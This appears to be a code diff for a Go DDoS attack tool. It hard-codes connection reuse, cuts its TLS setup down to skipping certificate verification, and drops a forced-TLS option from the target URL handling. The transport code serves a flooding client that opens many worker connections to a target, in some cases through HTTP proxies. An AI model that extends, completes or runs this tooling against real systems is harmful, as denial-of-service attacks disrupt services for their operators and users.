@@ -24,7 +24,7 @@ func (d *DDoSAttack) createHTTP2Transport() (*http.Transport, error) {
 			Timeout:   d.config.Timeout,
 			KeepAlive: 30 * time.Second,
 		}).DialContext,
-		DisableKeepAlives: !d.config.ReuseConnections,
+		DisableKeepAlives: false, // Always reuse connections
 	}
 
 	// Configure HTTP/2
@@ -43,7 +43,7 @@ func (d *DDoSAttack) createHTTP1Transport(numWorkers int) *http.Transport {
 		MaxIdleConns:        numWorkers,
 		MaxIdleConnsPerHost: numWorkers,
 		IdleConnTimeout:     30 * time.Second,
-		DisableKeepAlives:   !d.config.ReuseConnections,
+		DisableKeepAlives:   false, // Always reuse connections
 		DialContext: (&net.Dialer{
 			Timeout:   d.config.Timeout,
 			KeepAlive: 30 * time.Second,
@@ -51,26 +51,11 @@ func (d *DDoSAttack) createHTTP1Transport(numWorkers int) *http.Transport {
 	}
 }
 
-// createTLSConfig creates a TLS config based on attack settings
+// createTLSConfig creates a TLS config (simplified)
 func (d *DDoSAttack) createTLSConfig() *tls.Config {
-	config := &tls.Config{
+	return &tls.Config{
 		InsecureSkipVerify: true,
 	}
-
-	// Set TLS version range
-	if d.config.TLSMinVersion > 0 {
-		config.MinVersion = d.config.TLSMinVersion
-	}
-	if d.config.TLSMaxVersion > 0 {
-		config.MaxVersion = d.config.TLSMaxVersion
-	}
-
-	// Set cipher suites if specified
-	if len(d.config.TLSCipherSuites) > 0 {
-		config.CipherSuites = d.config.TLSCipherSuites
-	}
-
-	return config
 }
 
 // dialThroughHTTPProxy establishes a TCP (optionally TLS-wrapped) connection to the
@@ -174,28 +159,9 @@ func (d *DDoSAttack) dialThroughHTTPProxy(
 	return tlsConn, nil
 }
 
-// shouldUseTLS determines if TLS should be used based on URL or ForceTLS flag
+// shouldUseTLS determines if TLS should be used based on URL
 func (d *DDoSAttack) shouldUseTLS(targetURL string) (bool, string, string) {
-	// Check if URL already uses HTTPS
-	if strings.HasPrefix(targetURL, "https://") {
-		return true, "443", targetURL
-	}
-
-	// Check if ForceTLS is enabled
-	if d.config.ForceTLS {
-		// Convert HTTP to HTTPS
-		if strings.HasPrefix(targetURL, "http://") {
-			httpsURL := strings.Replace(targetURL, "http://", "https://", 1)
-			return true, "443", httpsURL
-		}
-		// If no scheme, assume HTTPS
-		if !strings.HasPrefix(targetURL, "http://") && !strings.HasPrefix(targetURL, "https://") {
-			httpsURL := "https://" + targetURL
-			return true, "443", httpsURL
-		}
-	}
-
-	// Default: use TLS only for HTTPS URLs
+	// Check if URL uses HTTPS
 	if strings.HasPrefix(targetURL, "https://") {
 		return true, "443", targetURL
 	}
